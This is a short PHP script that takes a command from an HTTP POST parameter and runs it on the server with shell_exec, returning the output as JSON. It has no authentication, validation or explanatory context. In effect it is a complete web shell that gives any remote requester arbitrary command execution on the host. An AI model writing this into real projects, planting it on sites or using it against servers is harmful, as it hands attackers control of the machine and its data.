<?php

$Option = !empty($_POST['Option']) ? $_POST['Option'] : 'execute_command';
$Command = !empty($_POST['Command']) ? $_POST['Command'] : 'ps';
$Result = '';
switch ($Option){
    case "execute_command":
        $Result = shell_exec($Command);
        break;
}

echo json_encode($Result);